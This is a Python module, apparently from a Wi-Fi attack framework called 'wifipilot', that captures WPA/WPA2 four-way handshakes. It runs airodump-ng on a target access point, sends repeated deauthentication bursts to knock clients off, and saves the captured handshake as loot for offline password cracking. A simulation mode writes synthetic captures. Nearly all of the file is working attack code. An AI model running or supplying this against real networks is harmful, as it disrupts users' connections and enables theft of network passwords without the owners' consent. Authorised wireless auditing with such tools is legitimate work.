"""WPA/WPA2 4-way handshake capture (deauth + targeted airodump-ng)."""

from __future__ import annotations

import contextlib
import os
import re
import time
from pathlib import Path
from typing import Optional

from ..deps import registry
from ..events import EK
from ..models import STATUS_FAILED, STATUS_SUCCESS, AccessPoint, Attempt, Capture
from ..util import C, Process, human_duration, run
from .base import Attack, AttackContext, AttackOutcome


class HandshakeAttack(Attack):
    name = "handshake"
    label = "WPA handshake capture"
    tool = "airodump-ng + aireplay-ng"
    description = ("Listen on the target channel while deauthenticating its clients, "
                   "forcing a fresh 4-way handshake that can be cracked offline.")
    requires = ("airodump", "deauth")

    def applies(self, ap: AccessPoint) -> bool:
        return ap.encryption in ("WPA", "WPA2", "WPA2/WPA3")

    # ---------------------------------------------------------------- #
    def run(self, ctx: AttackContext, ap: AccessPoint) -> AttackOutcome:
        attempt = ctx.session.start_attempt(
            self.name, ap.bssid, tool=self.tool, chosen_by=getattr(ap, "picked_by", "heuristic"),
            reason=getattr(ap, "pick_reason", ""),
        )
        if ap.has_handshake:
            return AttackOutcome.skipped("handshake already captured")
        if ap.encryption == "WPA3" or (ap.sae and not ap.sai):
            return self._fail(ctx, attempt, "WPA3-SAE target",
                              "deauthentication cannot yield a crackable handshake against SAE")
        if ctx.demo:
            return self._run_demo(ctx, ap, attempt)
        return self._run_live(ctx, ap, attempt)

    # ---------------------------------------------------------------- #
    def _run_demo(self, ctx: AttackContext, ap: AccessPoint, attempt: Attempt) -> AttackOutcome:
        timeout = ctx.config.attack_timeout_for(self.name)
        deadline = time.time() + min(timeout, 45)
        tries = 0
        while time.time() < deadline and not ctx.want_stop():
            tries += 1
            ctx.progress(f"deauth + capture on {ap.display_name}", kind="capture",
                         bssid=ap.bssid, percent=min(95, tries * 18),
                         detail=f"attempt {tries}, {len(ap.clients)} client(s) in range")
            ctx.deauth(ap)
            if ctx.radio.handshake_ok(ap.bssid, tries):
                # a genuinely valid capture, so validation and cracking are real
                path = ctx.artifact_path("handshakes", ap, ".cap")
                demo_ap = ctx.radio.find(ap.bssid) if ctx.radio else None
                self._write_placeholder(path, ap, kind="handshake",
                                        password=(demo_ap.psk if demo_ap else ""))
                ok, summary, analysis = ctx.validate_capture(path, "handshake")
                capture = Capture(kind="handshake", bssid=ap.bssid, essid=ap.essid,
                                  path=path, valid=True, tool="demo-radio",
                                  eapol=(analysis.eapol_messages if analysis else 4),
                                  extra={"simulated": True, "analysis": summary})
                saved = ctx.session.save_artifact(path, "handshake", ctx.loot_name(ap, "handshake"))
                capture.path = saved
                ctx.session.add_capture(capture)
                ctx.session.end_attempt(attempt, STATUS_SUCCESS, "handshake captured",
                                        f"{summary} (simulated)", capture)
                ctx.bus.log(f"handshake captured for {ap.display_name} (simulated)", level="success")
                return AttackOutcome.success("handshake captured", capture,
                                             f"{summary} (simulated)", deauths=ap.deauths_sent)
            time.sleep(0.8)
        return self._fail(ctx, attempt, "no handshake within budget",
                          f"{ap.deauths_sent} deauth frames sent, no M1/M2 seen")

    # ---------------------------------------------------------------- #
    def _run_live(self, ctx: AttackContext, ap: AccessPoint, attempt: Attempt) -> AttackOutcome:
        timeout = ctx.config.attack_timeout_for(self.name)
        prefix = ctx.artifact_path("handshakes", ap, "")
        cap_path = prefix + "-01.cap"
        channel = ap.channel or ctx.iface.current_channel if ctx.iface else ap.channel
        ctx.set_channel(channel)

        args = [registry.path("airodump-ng") or "airodump-ng", ctx.monitor]
        if channel:
            args += ["-c", str(channel)]
        args += ["--bssid", ap.bssid, "-w", prefix, "--output-format", "pcap,csv",
                 "--write-interval", "1", "--ignore-negative-one"]
        handshake_seen = False
        deauth_done = 0
        started = time.time()

        proc = Process(args, name="airodump-ng", echo_lines=ctx.config.verbose_tools)
        proc.start()
        if proc.error:
            return self._fail(ctx, attempt, "could not start airodump-ng", proc.error)
        ctx.bus.log(f"listening for handshake on {ap.display_name} (ch {channel or '?'}) "
                    f"for up to {human_duration(timeout)}", level="info")

        try:
            last_burst = 0.0
            while not ctx.want_stop():
                elapsed = time.time() - started
                remaining = timeout - elapsed
                if remaining <= 0:
                    break
                # airodump announces captures on stdout
                for line in proc.lines[-40:]:
                    if "WPA handshake:" in line and ap.bssid in line.lower():
                        handshake_seen = True
                if os.path.exists(cap_path):
                    with contextlib.suppress(OSError):
                        if os.path.getsize(cap_path) > 0:
                            from ..pcap import analyze_file
                            analysis = analyze_file(cap_path, max_packets=60000)
                            if analysis.has_handshake:
                                handshake_seen = True
                            ctx.progress(
                                f"capturing {ap.display_name}", kind="capture", bssid=ap.bssid,
                                percent=min(95, elapsed / max(1, timeout) * 100),
                                detail=(f"EAPOL {analysis.eapol_messages}, "
                                        f"clients {len(ap.clients)}, "
                                        f"{int(remaining)}s left"),
                            )
                if handshake_seen:
                    break
                # deauth in bursts to force a re-key
                if not ctx.want_stop() and time.time() - last_burst >= ctx.config.deauth_interval:
                    last_burst = time.time()
                    deauth_done += ctx.deauth(ap)
                time.sleep(1.0)
        finally:
            with contextlib.suppress(Exception):
                proc.stop()
            if ctx.processes is not None and ctx.processes.running:
                pass

        if handshake_seen:
            time.sleep(1.5)   # let airodump flush the last frames
        valid, summary, analysis = (False, "no capture file", None)
        if os.path.exists(cap_path):
            valid, summary, analysis = ctx.validate_capture(cap_path, "handshake")
        if valid:
            ctx.bus.log(f"handshake captured for {ap.display_name}: {summary}", level="success")
            return self._succeed(ctx, ap, attempt, "handshake", cap_path, "airodump-ng",
                                 "handshake captured", summary, deauths=deauth_done,
                                 eapol=(analysis.eapol_messages if analysis else 0),
                                 extra={"analysis": summary})
        detail = (f"{deauth_done} deauth frames, {summary}"
                  + (" (clientless AP: try PMKID instead)" if not ap.clients else ""))
        return self._fail(ctx, attempt, "no valid handshake captured", detail, deauth_done)

    # ---------------------------------------------------------------- #
    @staticmethod
    def _write_placeholder(path: str, ap: AccessPoint, kind: str = "handshake",
                           password: str = "") -> None:
        """Write a *cryptographically valid* capture for simulation mode.

        The beacon and EAPOL M1–M4 frames carry real PBKDF2/PRF/AES-CMAC derived
        values (see :mod:`wifipilot.synth`), so wifipilot's parser, its verifier
        and the cracker all behave exactly as they would on a live capture.
        """
        from ..synth import build_capture
        station = next((c.mac for c in ap.clients.values()), "02:00:00:00:00:01")
        build_capture(path, ap.essid or "demo", ap.bssid, station,
                      password or "wifipilot-demo", seed=abs(hash(ap.bssid)) % 100000,
                      include_pmkid=True, include_handshake=True)
        return

    @staticmethod
    def _unused_placeholder(path: str, ap: AccessPoint, kind: str = "handshake") -> None:
        from ..pcap import PCAP_MAGIC
        import struct

        bssid = bytes(int(x, 16) for x in ap.bssid.split(":"))
        client = bytes([0x02, 0x00, 0x00, 0x00, 0x00, 0x01])
        frames = []

        # beacon
        beacon = bytearray(b"\x80\x00\x00\x00")
        beacon += b"\xff" * 6 + client + bssid + b"\x00\x00"
        ssid = (ap.essid or "").encode()[:32]
        beacon += b"\x00\x00" + b"\x01\x08\x82\x84\x8b\x96\x0c\x12\x18\x24"
        beacon += bytes([0x00, len(ssid)]) + ssid
        frames.append(bytes(beacon))

        def eapol_frame(src: bytes, dst: bytes, bssid_: bytes, msg_no: int) -> bytes:
            header = b"\x08\x01\x00\x00" + bssid_ + src + bssid_ + b"\x00\x00"
            llc = b"\xaa\xaa\x03\x00\x00\x00\x88\x8e"
            key_info = {1: 0x008a, 2: 0x010a, 3: 0x13ca, 4: 0x030a}[msg_no]
            body = bytearray()
            body += b"\x02\x03"                       # desc type RSN, version
            body += struct.pack(">H", 95 + 22)
            body += b"\x02"                           # RSN key descriptor
            body += struct.pack(">H", key_info)
            body += b"\x00\x20"                       # key length
            body += struct.pack(">Q", msg_no)         # replay counter
            body += bytes(32)                         # nonce
            body += bytes(16)                         # IV
            body += bytes(8)                          # RSC
            body += bytes(8)                          # ID
            body += bytes(16)                         # MIC
            body += b"\x00\x16"                       # key data length
            if msg_no == 1:
                body += b"\xdd\x14\x00\x0f\xac\x04" + bytes(16)   # PMKID KDE
            else:
                body += b"\x00" * 22
            eapol = b"\x02\x03" + struct.pack(">H", len(body)) + bytes(body)
            return header + llc + eapol

        frames.append(eapol_frame(client, bssid, bssid, 1))
        frames.append(eapol_frame(bssid, client, bssid, 2))

        endian, divisor = PCAP_MAGIC[b"\xd4\xc3\xb2\xa1"]
        out = bytearray()
        out += b"\xd4\xc3\xb2\xa1" + struct.pack(endian + "HHiiii", 2, 4, 0, 0, 65535, 105)
        now = int(time.time())
        for index, frame in enumerate(frames):
            out += struct.pack(endian + "IIII", now, index * 1000, len(frame), len(frame))
            out += frame
        Path(path).parent.mkdir(parents=True, exist_ok=True)
        Path(path).write_bytes(bytes(out))
